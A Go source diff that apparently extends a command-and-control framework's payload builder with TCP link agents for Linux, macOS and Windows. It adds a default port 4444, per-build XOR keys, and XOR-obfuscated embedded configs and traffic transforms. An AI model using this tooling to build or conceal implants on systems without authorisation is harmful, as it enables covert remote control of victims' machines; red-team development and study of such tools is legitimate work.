@@ -103,9 +103,12 @@ type PayloadRequest struct {
 		OutputPath   string       `json:"output_path"`
 		SafetyChecks SafetyChecks `json:"safety_checks,omitempty"` // Added safety checks
 		// SMB-specific options
-		PayloadType string `json:"payload_type,omitempty"` // "http" or "smb"
+		PayloadType string `json:"payload_type,omitempty"` // "http", "smb", or "tcp"
 		PipeName    string `json:"pipe_name,omitempty"`    // For SMB payloads
 		SMBProfile  string `json:"smb_profile,omitempty"`  // SMB profile name for transforms
+		// TCP-specific options
+		TCPPort    string `json:"tcp_port,omitempty"`    // For TCP payloads
+		TCPProfile string `json:"tcp_profile,omitempty"` // TCP profile name for transforms
 	} `json:"data"`
 }
 
@@ -141,11 +144,15 @@ type buildData struct {
 	os             string
 	arch           string
 	safetyChecks   SafetyChecks // Added safety checks to build data
-	payloadType    string       // "http" or "smb"
+	payloadType    string       // "http", "smb", or "tcp"
 	pipeName       string       // For SMB payloads
 	smbProfile     string       // SMB profile name for transforms
 	smbXorKey      string       // Per-build unique XOR key for SMB transforms
 	httpXorKey     string       // Per-build unique XOR key for HTTP transforms
+	// TCP-specific fields
+	tcpPort    string // For TCP payloads
+	tcpProfile string // TCP profile name for transforms
+	tcpXorKey  string // Per-build unique XOR key for TCP transforms
 }
 
 func NewBuilder(manager *listeners.Manager, hubClient *hub.Hub, db *sql.DB, agentClient *agent.Client, agentCfg *config.AgentConfig) (*Builder, error) {
@@ -912,6 +919,12 @@ func (b *Builder) initializeBuildData(ctx context.Context, req PayloadRequest) (
 		return nil, fmt.Errorf("failed to generate SMB XOR key: %v", err)
 	}
 
+	// Generate TCP-specific XOR key for transform encryption (per-build unique)
+	tcpXorKey, err := GenerateRandomString(12)
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate TCP XOR key: %v", err)
+	}
+
 	// HTTP profiles use static XOR keys from config.toml (no per-build keys)
 	// This simplifies the implementation - agent and server both use profile's static key
 	var httpXorKey string // Empty - not used for HTTP, kept for struct compatibility
@@ -923,16 +936,20 @@ func (b *Builder) initializeBuildData(ctx context.Context, req PayloadRequest) (
 
 	// Auto-detect payload type based on listener protocol
 	if payloadType == "" {
-		if listenerProtocol == "SMB" {
+		switch listenerProtocol {
+		case "SMB":
 			payloadType = "smb"
 			log.Printf("[Builder] Auto-detected SMB payload type from listener protocol")
-		} else {
+		case "TCP":
+			payloadType = "tcp"
+			log.Printf("[Builder] Auto-detected TCP payload type from listener protocol")
+		default:
 			payloadType = "http" // Default to HTTP for HTTP/HTTPS/RPC
 		}
 	}
 
 	connectionType := "edge"
-	if payloadType == "smb" || listenerProtocol == "SMB" || listenerProtocol == "RPC" {
+	if payloadType == "smb" || payloadType == "tcp" || listenerProtocol == "SMB" || listenerProtocol == "TCP" || listenerProtocol == "RPC" {
 		connectionType = "link"
 	}
 
@@ -947,11 +964,24 @@ func (b *Builder) initializeBuildData(ctx context.Context, req PayloadRequest) (
 		log.Printf("[Builder] Using default pipe name: spoolss")
 	}
 
+	// Set TCP port - use listener's port first, then request port, then default
+	tcpPort := req.Data.TCPPort
+	if payloadType == "tcp" {
+		// First priority: use listener's port (from database)
+		if b.listener != nil && b.listener.Port > 0 {
+			tcpPort = fmt.Sprintf("%d", b.listener.Port)
+			log.Printf("[Builder] Using listener's TCP port: %s", tcpPort)
+		} else if tcpPort == "" {
+			tcpPort = "4444" // Default TCP port
+			log.Printf("[Builder] Using default TCP port: 4444")
+		}
+	}
+
 	binaryName := b.generateBinaryName(req)
 	initID := uuid.New()
 
-	log.Printf("[Builder] Initializing build data - payload_type=%s, connection_type=%s, pipe_name=%s",
-		payloadType, connectionType, pipeName)
+	log.Printf("[Builder] Initializing build data - payload_type=%s, connection_type=%s, pipe_name=%s, tcp_port=%s",
+		payloadType, connectionType, pipeName, tcpPort)
 
 	data := &buildData{
 		initID:         initID,
@@ -969,6 +999,9 @@ func (b *Builder) initializeBuildData(ctx context.Context, req PayloadRequest) (
 		smbProfile:     req.Data.SMBProfile, // SMB profile for transforms
 		smbXorKey:      smbXorKey,           // Per-build unique XOR key for SMB transforms
 		httpXorKey:     httpXorKey,          // Per-build unique XOR key for HTTP transforms
+		tcpPort:        tcpPort,             // TCP port for TCP payloads
+		tcpProfile:     req.Data.TCPProfile, // TCP profile for transforms
+		tcpXorKey:      tcpXorKey,           // Per-build unique XOR key for TCP transforms
 	}
 
 	// Fall back to listener's SMB profile if not specified in the request
@@ -978,9 +1011,15 @@ func (b *Builder) initializeBuildData(ctx context.Context, req PayloadRequest) (
 		data.smbProfile = b.listener.SMBProfile
 		if data.smbProfile != "" {
 			log.Printf("[Builder] Using listener's SMB profile: %s", data.smbProfile)
-		} else {
+		} else if payloadType == "smb" {
 			log.Printf("[Builder] WARNING: Listener has no SMB profile set, transforms will not be embedded")
 		}
+	}
+
+	// Fall back to listener's TCP profile if not specified in the request
+	if data.tcpProfile == "" && b.listener != nil && b.listener.TCPProfile != "" {
+		data.tcpProfile = b.listener.TCPProfile
+		log.Printf("[Builder] Using listener's TCP profile: %s", data.tcpProfile)
 	}
 
 	// Store in database
@@ -1009,8 +1048,8 @@ func (b *Builder) generateBinaryName(req PayloadRequest) string {
 
 func (b *Builder) storeBuildData(ctx context.Context, data *buildData) error {
 	_, err := b.db.ExecContext(ctx, `
-        INSERT INTO inits (id, clientID, type, secret, os, arch, RSAkey, smb_profile, smb_xor_key, http_xor_key)
-        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
+        INSERT INTO inits (id, clientID, type, secret, os, arch, RSAkey, smb_profile, smb_xor_key, http_xor_key, tcp_profile, tcp_xor_key, protocol)
+        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13)
     `,
 		data.initID,
 		data.clientID,
@@ -1022,6 +1061,9 @@ func (b *Builder) storeBuildData(ctx context.Context, data *buildData) error {
 		data.smbProfile,
 		data.smbXorKey,
 		data.httpXorKey,
+		data.tcpProfile,
+		data.tcpXorKey,
+		strings.ToUpper(data.payloadType), // Store protocol: "HTTP", "SMB", or "TCP"
 	)
 	return err
 }
@@ -1039,6 +1081,9 @@ func (b *Builder) registerWithAgentService(ctx context.Context, data *buildData)
 		"smbProfile": data.smbProfile,
 		"smbXorKey":  data.smbXorKey,
 		"httpXorKey": data.httpXorKey,
+		"tcpProfile": data.tcpProfile,
+		"tcpXorKey":  data.tcpXorKey,
+		"tcpPort":    data.tcpPort,
 	}
 
 	grpcCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
@@ -1361,6 +1406,60 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, payloadConfig *Payloa
 		}
 	}
 
+	// Add TCP-specific environment variables
+	if data.payloadType == "tcp" {
+		envVars = append(envVars, fmt.Sprintf("TCP_PORT=%s", data.tcpPort))
+
+		// Create encrypted config for TCP agent
+		// The config is XOR encrypted with the PLAIN secret
+		// Key names must match what the TCP agent expects in main.go
+		tcpConfig := map[string]string{
+			"TCP Port":   data.tcpPort,
+			"Secret":     data.secret,
+			"Public Key": data.keyPair.PublicKeyPEM,
+		}
+		configJSON, err := json.Marshal(tcpConfig)
+		if err != nil {
+			return nil, fmt.Errorf("failed to marshal TCP config: %v", err)
+		}
+
+		// XOR encrypt config with the plain secret
+		secretBytes := []byte(data.secret)
+		encrypted := make([]byte, len(configJSON))
+		for i, b := range configJSON {
+			encrypted[i] = b ^ secretBytes[i%len(secretBytes)]
+		}
+		encryptedConfig := base64.StdEncoding.EncodeToString(encrypted)
+
+		envVars = append(envVars, fmt.Sprintf("ENCRYPTED_CONFIG=%s", encryptedConfig))
+		log.Printf("[Builder] Created encrypted TCP config for port: %s", data.tcpPort)
+
+		// Serialize TCP profile transforms if configured
+		if data.tcpProfile != "" {
+			tcpLinkConfig, err := config.GetTCPLinkConfig()
+			if err == nil && tcpLinkConfig != nil {
+				if tcpProfile := tcpLinkConfig.GetTCPProfile(data.tcpProfile); tcpProfile != nil && tcpProfile.Data != nil {
+					// Modify XOR transform values to use per-build unique key
+					modifiedData := modifyXorTransformValue(tcpProfile.Data, data.tcpXorKey)
+					tcpDataTransforms := serializeDataBlockCompact(modifiedData)
+					if tcpDataTransforms != "" {
+						// XOR encrypt with xorKey (same as other encrypted values)
+						xorKeyBytes := []byte(data.xorKey)
+						transformBytes := []byte(tcpDataTransforms)
+						encryptedTransforms := make([]byte, len(transformBytes))
+						for i, b := range transformBytes {
+							encryptedTransforms[i] = b ^ xorKeyBytes[i%len(xorKeyBytes)]
+						}
+						encryptedValues["TCP_DATA_TRANSFORMS"] = base64.StdEncoding.EncodeToString(encryptedTransforms)
+						log.Printf("[Builder] Added TCP data transforms with unique XOR key from profile: %s", data.tcpProfile)
+					}
+				} else {
+					log.Printf("[Builder] TCP profile '%s' not found or has no transforms", data.tcpProfile)
+				}
+			}
+		}
+	}
+
 	// Add encrypted values to environment variables
 	for k, v := range encryptedValues {
 		envVars = append(envVars, fmt.Sprintf("%s=%s", k, v))
@@ -1393,6 +1492,9 @@ func (b *Builder) buildPayloadBinary(ctx context.Context, binaryName string, env
 			fmt.Sprintf("%s/Linux:/build/Linux:ro", hostPayloadsPath),
 			fmt.Sprintf("%s/Windows:/build/Windows:ro", hostPayloadsPath),
 			fmt.Sprintf("%s/SMB_Windows:/build/SMB_Windows:ro", hostPayloadsPath),
+			fmt.Sprintf("%s/TCP_Linux:/build/TCP_Linux:ro", hostPayloadsPath),
+			fmt.Sprintf("%s/TCP_Darwin:/build/TCP_Darwin:ro", hostPayloadsPath),
+			fmt.Sprintf("%s/TCP_Windows:/build/TCP_Windows:ro", hostPayloadsPath),
 			fmt.Sprintf("%s/shared:/build/shared:ro", hostPayloadsPath),
 		},
 	}
